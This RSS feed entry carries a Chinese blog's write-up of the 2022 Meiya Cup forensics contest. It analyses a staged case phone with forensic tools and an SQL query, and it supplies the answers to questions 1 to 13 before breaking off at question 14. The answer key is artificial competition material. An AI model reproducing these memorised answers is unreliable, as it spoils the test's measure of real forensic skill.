<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Forensics on kakahuote</title>
        <link>https://blog.928330.xyz/tags/forensics/</link>
        <description>Recent content in Forensics on kakahuote</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Example Person</copyright>
        <lastBuildDate>Sun, 24 Aug 2025 21:42:35 +0800</lastBuildDate><atom:link href="https://blog.928330.xyz/tags/forensics/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>美亚杯2022取证总结</title>
        <link>https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</link>
        <pubDate>Fri, 15 Aug 2025 21:32:09 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</guid>
        <description>&lt;img src="http://picture.928330.xyz/typora/638b75a2d7286.jpg" alt="Featured image of post 美亚杯2022取证总结" /&gt;&lt;p&gt;最诡异的一集，资格赛恐怖如斯&lt;/p&gt;
&lt;p&gt;过程中要数次用到数据库，最好可以使用navicate&lt;/p&gt;
&lt;p&gt;检材分卷压缩，一共九卷，解压之后使用Veracrypt挂载就能得到题目&lt;/p&gt;
&lt;h1 id=&#34;王晓琳手机1-14&#34;&gt;王晓琳手机(1-14)
&lt;/h1&gt;&lt;h2 id=&#34;1王晓琳手机的imei号是什么以阿拉伯数字回答&#34;&gt;1.王晓琳手机的IMEI号是什么?(以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813180119718&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813180119718.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813180119718.png&#34; alt=&#34;image-20250813180119718&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;352978115584444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2王晓琳的手机安装了什么即时通讯软件lnstant-messaging-apps&#34;&gt;2.王晓琳的手机安装了什么即时通讯软件(lnstant Messaging Apps)?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. Signal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 微信(WeChat)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. QQ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. WhatsApp&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. LINE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在应用列表看到了&lt;strong&gt;微信&lt;/strong&gt;和&lt;strong&gt;WhatsApp&lt;/strong&gt;，说明这一题是多选啊&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813181502609&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813181502609.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813181502609.png&#34; alt=&#34;image-20250813181502609&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;在基本信息 -&amp;gt; 应用列表里面过滤应用分类为&amp;quot;即时通信&amp;quot;，又发现一个没有显示的&lt;strong&gt;Signal&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813181914269&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813181914269.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813181914269.png&#34; alt=&#34;image-20250813181914269&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ABD
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3王晓琳于什么日子和时间曾经通过即时通讯软件发出一个pdf档案以时区utc8回答&#34;&gt;3.王晓琳于什么日子和时间曾经通过即时通讯软件发出一个PDF档案?(以时区UTC+8回答)
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.2022-09-30 17:39:53&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.2022-10-01 17:39:53&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.2022-09-30 18:30:28&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.2022-10-01 16:30:22&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在WhatsApp的文件传输记录里找到一个名为staff A team.pdf：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813182714049&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813182714049.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813182714049.png&#34; alt=&#34;image-20250813182714049&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4承上题这个-pdf-档案的md5哈希值hash-value-是什么以大写英文及阿拉伯数字回答&#34;&gt;4.承上题，这个 PDF 档案的MD5哈希值(Hash Value) 是什么?(以大写英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;这个文件在挂载中好像改了名，变成了内部编号，所以我们在文件里面搜索不到&lt;/p&gt;
&lt;p&gt;不过直接在上题的聊天记录里面点击，就能在本地文件管理器找到挂载的这个pdf文件了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813184423743&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813184423743.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813184423743.png&#34; alt=&#34;image-20250813184423743&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813184510972&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813184510972.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813184510972.png&#34; alt=&#34;image-20250813184510972&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;之后不管是用poweshell，还是在火眼里面计算都可以：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813184659606&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813184659606.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813184659606.png&#34; alt=&#34;image-20250813184659606&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AE0D6735BBE45B0B8F1AB7838623D9C8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5王晓琳将这个pdf档案发给哪一个用户而该用户的手机号码是什么&#34;&gt;5.王晓琳将这个PDF档案发给哪一个用户,而该用户的手机号码是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.85297663607&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.85259308538&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.85269707307&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.85246427813&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在好友消息里面一个个查找就行：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813185156416&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813185156416.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813185156416.png&#34; alt=&#34;image-20250813185156416&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6王晓琳发出这个pdf档案的原因是什么&#34;&gt;6.王晓琳发出这个PDF档案的原因是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.寻求协助&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.分享档案内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.错误发出&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.无法开启&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看一下聊天记录就知道了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813185325090&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813185325090.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813185325090.png&#34; alt=&#34;image-20250813185325090&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7承上题分析王晓琳与上述用户的对话他们的关系是什么&#34;&gt;7.承上题，分析王晓琳与上述用户的对话，他们的关系是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 客户&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 师生&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 家人&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 同事&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同样是查看聊天记录，有电脑部、返工等等字样，应该是同事：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813185522647&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813185522647.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813185522647.png&#34; alt=&#34;image-20250813185522647&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其实从这里也就能看出，对方就是本案件嫌疑人林俊熙，两人应该是从同事变成恋人，而后分手&lt;/p&gt;
&lt;p&gt;后面的照片也和案件调查的内容对应上了&lt;/p&gt;
&lt;h2 id=&#34;8王晓琳于何时要求上述用户删除一张照片&#34;&gt;8.王晓琳于何时要求上述用户删除一张照片?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 2022-10-06&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 2022-09-28&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 2022-09-30&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 2022-10-03&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;依旧聊天记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813185846382&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813185846382.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813185846382.png&#34; alt=&#34;image-20250813185846382&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9承上题该用户向王晓琳提出什么要求以删除这张照片&#34;&gt;9.承上题，该用户向王晓琳提出什么要求以删除这张照片?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 金钱&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 毒品&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 性服务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 加密货币&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同上题图，“比钱我就删除”，就是要钱&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10王晓琳的手机里有什么电子书籍electronic-book-&#34;&gt;10.王晓琳的手机里有什么电子书籍(Electronic Book) ?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 三国演义&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 红楼梦&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 水浒传&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 西游记&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先的思路就是去找有没有相关的app，但是现在支持详细分析的似乎没有一个是电子书阅读平台&lt;/p&gt;
&lt;p&gt;所以接下来就是去翻第二题找过的应用列表，但我也不知道哪个是阅读软件，所以要请出伟大的ai大人了&lt;/p&gt;
&lt;p&gt;不知道为什么我不能导出成csv，只能一段段截图喂给ai了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814100941088&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814100941088.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814100941088.png&#34; alt=&#34;image-20250814100941088&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;ai真是太好用了你们知道吗&lt;/p&gt;
&lt;p&gt;但很遗憾，就算我找到了电子阅读书的软件，也不知道在哪找书的数据&lt;/p&gt;
&lt;p&gt;所以换一个思路，直接使用火眼的全局搜索功能把所有选项都找一遍：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814090331769&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814090331769.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814090331769.png&#34; alt=&#34;image-20250814090331769&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;很幸运第一个选项三国演义就找到了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814090353096&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814090353096.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814090353096.png&#34; alt=&#34;image-20250814090353096&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;D选项当然也是没有的：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814101817637&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814101817637.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814101817637.png&#34; alt=&#34;image-20250814101817637&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;11王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果highlight&#34;&gt;11.王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果(Highlight)?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 卿有何妙计&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 宝玉已是三杯过去了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 武松那日早饭罢&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 就除他做个弼马温罢&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不知道怎么找，直接看选项&lt;/p&gt;
&lt;p&gt;选项B是红楼梦，C是水浒传，D应该是西游记，A就应该是三国演义了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814101525488&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814101525488.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814101525488.png&#34; alt=&#34;image-20250814101525488&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814101545665&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814101545665.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814101545665.png&#34; alt=&#34;image-20250814101545665&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;为了保险我们直接全局搜索AD两项，也是很幸运，A又搜到了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814101440840&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814101440840.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814101440840.png&#34; alt=&#34;image-20250814101440840&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;12王晓琳的手机里有一个-mtr-mobile-港铁的手机程序mobile-app检视其数据库database-的数据王晓琳于2022年10月11日-2204-时将一行程加入书签bookmark这段行程的起点及终点站包括&#34;&gt;12.王晓琳的手机里有一个 &amp;lsquo;MTR Mobile &amp;lsquo;(港铁)的手机程序(Mobile App)。检视其数据库(Database) 的数据，王晓琳于2022年10月11日 22:04 时将一行程加入书签(Bookmark)，这段行程的起点及终点站包括?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 尖沙咀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 红硒&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 康城&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 青衣&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. 沙田&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接在文件系统里面搜索MTR，可以在搜出来的同级目录下找到一个数据库：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813202924289&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813202924289.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813202924289.png&#34; alt=&#34;image-20250813202924289&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;此外在MTRmobile文件夹下也有很多的数据库，不过我们先一个一个试，用SQLite类型连接数据库：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250813210514140&#34; href=&#34;http://picture.928330.xyz/typora/image-20250813210514140.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250813210514140.png&#34; alt=&#34;image-20250813210514140&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里面很多字段和选项一样，可能是找对了&lt;/p&gt;
&lt;p&gt;CREATE_DATE字段&lt;/p&gt;
&lt;p&gt;我们需要搜索2022年10月11日22:04之后的条目，先找个网站转换时间戳：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tool.chinaz.com/tools/unixtime.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tool.chinaz.com/tools/unixtime.aspx
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814101630078&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814101630078.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814101630078.png&#34; alt=&#34;image-20250814101630078&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;使用sql语句在表里面查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;BookmarkNHistory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CREATED_DATE&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1665497040&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ORDER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CREATED_DATE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只查询出来一条语句，应该就是目标：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814101722172&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814101722172.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814101722172.png&#34; alt=&#34;image-20250814101722172&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;13王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片以阿拉伯数字回答&#34;&gt;13.王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片?(以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;基本信息 -&amp;gt; 图片，把创建时间改成2022-10-2当天：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250814102214879&#34; href=&#34;http://picture.928330.xyz/typora/image-20250814102214879.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250814102214879.png&#34; alt=&#34;image-20250814102214879&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;每一张最好都看一下，我大致看了，应该都是风景照没错&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;90
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14检视王晓琳的手机照片她于2022年10月2日到过什么地方&#34;&gt;14.检视王晓琳的手机照片，她于2022年10月2日到过什么地方?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.大潭郊游径&lt;/strong&gt;&lt;/p&gt;
